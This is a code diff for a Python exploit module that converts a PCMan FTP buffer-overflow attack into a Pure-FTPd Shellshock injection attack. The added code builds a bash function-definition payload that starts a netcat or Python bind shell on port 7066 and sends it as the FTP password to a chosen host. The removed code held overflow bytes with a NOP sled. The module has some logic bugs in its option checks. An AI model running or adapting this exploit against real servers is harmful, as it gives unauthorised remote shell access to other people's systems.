@@ -1,6 +1,7 @@
 import ftplib
 import cmd
 import random
+import string
 from socket import AF_INET, SOCK_STREAM, socket, gethostbyname
 
 def getToken(line):
@@ -12,11 +13,11 @@ def getToken(line):
             break
     return token
 
-class pcmanPutOverflowMenu(cmd.Cmd):
+class pureftpdBashInjectionMenu(cmd.Cmd):
   def __init__(self):
     cmd.Cmd.__init__(self)
-    self.user = ["anonymous"]
-    self.passwd = ["anonymous@example.com"]
+    self.rpath = [""]
+    self.shell = ["python"]
     self.host = ["ftp.debian.org"]
   def help_help(self):
     print "Usage: help [cmd]"
@@ -31,12 +32,16 @@ class pcmanPutOverflowMenu(cmd.Cmd):
   def do_set(self, args):
     var = getToken(args)
     val = args[len(var) + 3:]
-    if var == "user":
-      self.user[0] = val
-    elif var == "passwd":
-      self.passwd[0] = val
+    if var == "rpath":
+      self.rpath[0] = val
     elif var == "host":
       self.host[0] = val
+    elif var == "shell":
+      if val == "python" or shell == "netcat":
+        self.shell[0] = val
+      else:
+        print "*** Value: must be \"python\" or \"netcat\""
+        return
     else:
       print "*** Variable not found %s" % var
       return
@@ -45,15 +50,15 @@ class pcmanPutOverflowMenu(cmd.Cmd):
     print "Usage: show options"
     print "show options: show the variables, current values, and descriptions"
   def do_show(self, args):
-    print "Target: Windows XP SP3 English"
-    print "Options for pcman_put_overflow:"
+    print "Targets: Linux x86 & Linux x86 64-bit"
+    print "Options for pureftpd_bash_injection:"
     print "========================"
-    print "user    %s    the user to login in as" % self.user[0]
-    print "passwd    %s    the password of the user" % self.passwd[0]
-    print "host    %s    the IP of the target"
+    print "rpath    %s    the target path where binaries (ls, sh, ps, etc) are kept" % self.rpath[0]
+    print "shell    %s    how to spawn the shell"
+    print "host    %s    the IP of the target" % self.host[0]
   def help_exit(self):
     print "Usage: exit"
-    print "exit: exit the pcman_put_overflow context"
+    print "exit: exit the pureftpd_bash_injection context"
   def do_exit(self, args):
     if args:
       return
@@ -65,33 +70,21 @@ class pcmanPutOverflowMenu(cmd.Cmd):
     for let in "abcdefghijklmnopqrstuvwxyz":
       if let in self.host[0]:
         self.host[0] = gethostbyname(self.host[0])
-      ftp = ftplib.FTP(self.host[0])
-    try:
-     ftp.login(self.user[0], self.passwd[0])
-     print "[+]Login successful on %s" % self.host[0]
-    except:
-      print "[-]Login unsuccessful on %s" % self.host[0]
-      return
-    ftp.quit()
     print "[*]Generating payload..."
-    char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
-    payload = ""
-    for a in range(0, 2017):
-      payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
-    payload += "\x77\xc3\x54\x59"
-    payload += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
-    f = open("../../../payloads/pcman_put.shell", "r")
-    for line in f.readlines():
-      payload += line[:-1].decode('string_escape')
-    f.close()
+    if self.shell[0] == "nc":
+      shell = "nc -lp 7066 -e /bin/sh &"
+    elif self.shell[0] == "python":
+      shell = "python -c 'import os, subprocess; from socket import *; s = socket(AF_INET, SOCK_STREAM); s.bind((\"localhost\", 7066)); s.listen(5); client, addr = s.accept(); os.dup2(client.fileno(), 0); os.dup2(client.fileno(), 1); os.dup2(client.fileno(), 2); p = subprocess.call([\"/bin/sh\", \"-i\"])' &"
+    payload = "() { :;}; %s/sh -c %s" % (self.rpath[0], shell)
+    s = string.lowercase + string.digits
+    user = ''.join(random.sample(s, 20))
     print "[+]Payload generated."
-    print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
+    print "[*]Sending payload: " + payload
     s = socket(AF_INET, SOCK_STREAM)
     s.connect((self.host[0], 21))
     s.recv(1024)
-    s.send("USER " + self.user[0])
+    s.send("USER " + user)
     s.recv(1024)
-    s.send("PASS " + self.passwd[0])
+    s.send("PASS " + payload)
     s.recv(1024)
-    s.send("PUT " + payload)
     print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
